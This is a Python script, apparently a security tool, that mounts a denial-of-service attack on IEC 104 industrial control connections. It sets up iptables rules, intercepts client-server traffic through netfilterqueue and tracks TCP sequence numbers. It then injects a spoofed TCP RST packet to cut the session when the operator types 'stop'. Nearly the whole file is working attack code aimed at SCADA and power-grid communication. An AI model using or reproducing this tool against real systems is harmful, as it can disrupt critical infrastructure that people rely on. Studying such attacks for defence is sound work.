import netfilterqueue
import threading
from kamene.layers.inet import *
from kamene.all import *
import typer
from utils.utils import *


class IEC104DOS:
    def __init__(self, client_ip: str, server_ip: str, server_port: int):
        self.client_ip = client_ip
        self.server_ip = server_ip
        self.server_port = server_port
        self.client_port = None

        self.client_tcp_seq_next, self.client_tcp_ack = None, None

    def extract_tcp_seq(self, packet: IP) -> None:
        if packet['IP'].src == self.client_ip:
            tcp_seq, tcp_seq_next, tcp_ack = extract_tcp_details(packet)
            self.client_tcp_seq_next = tcp_seq_next
            self.client_tcp_ack = tcp_ack
            self.client_port = packet['TCP'].sport

    def send_packet(self, packet: IP):
        send(packet, verbose=False)

    def packet_handler(self, packet: netfilterqueue.Packet) -> None:
        smart_packet = IP(packet.get_payload())
        if smart_packet['IP'].src in [self.client_ip, self.server_ip] and \
                smart_packet['IP'].dst in [self.client_ip, self.server_ip] and \
                self.server_port in [smart_packet['TCP'].sport, smart_packet['TCP'].dport]:
            self.extract_tcp_seq(smart_packet)
            self.send_packet(smart_packet)
            packet.drop()
        else:
            packet.accept()

    def inject_rst(self):
        if None in [self.client_tcp_seq_next, self.client_tcp_ack]:
            typer.secho("[-] Some values are still None, try again later!", fg=typer.colors.RED)
            return

        ip = IP(src=self.client_ip, dst=self.server_ip)
        tcp = TCP(dport=self.server_port, sport=self.client_port)
        tcp.seq = self.client_tcp_seq_next
        tcp.ack = self.client_tcp_ack
        tcp.flags = 4
        tcp.window = 502
        packet = ip / tcp
        update_checksums(packet)
        send(packet, verbose=False)

    def read_command(self):
        while True:
            try:
                command = input("Command: ")
                if command == "stop":
                    self.inject_rst()
            except ValueError:
                pass

    def start(self, queue_id=1):
        net_filter_queue = netfilterqueue.NetfilterQueue()
        net_filter_queue.bind(queue_id, self.packet_handler)
        try:
            net_filter_queue.run()
        except KeyboardInterrupt:
            print('')

        net_filter_queue.unbind()


def main(
        client_ip: str = typer.Argument(..., help="IP address of the IEC client"),
        server_ip: str = typer.Argument(..., help="IP address of the IEC server"),
        server_port: int = typer.Option(2404, help="TCP port number of the IEC server.")
):
    if not is_ipv4_address(data=client_ip) or not is_ipv4_address(data=server_ip):
        typer.secho("[-] Invalid client/server IP provided.", fg=typer.colors.RED)
        exit(1)
    if not is_tcp_port(data=server_port):
        typer.secho("[-] Invalid server port provided.", fg=typer.colors.RED)
        exit(1)
    try:
        typer.secho("[*] Trying to setup iptables rules.", fg=typer.colors.YELLOW)
        setup_iptables(client_ip=client_ip, server_ip=server_ip, server_port=server_port)
        typer.secho("[+] Rules added!", fg=typer.colors.GREEN)
    except:
        typer.secho("[-] Something went wrong during rule manipulation!.", fg=typer.colors.RED)
        exit(1)

    dos = IEC104DOS(client_ip, server_ip, server_port)
    thread1 = threading.Thread(target=dos.start)
    thread1.daemon = True
    thread1.start()
    dos.read_command()


if __name__ == "__main__":
    typer.run(main)
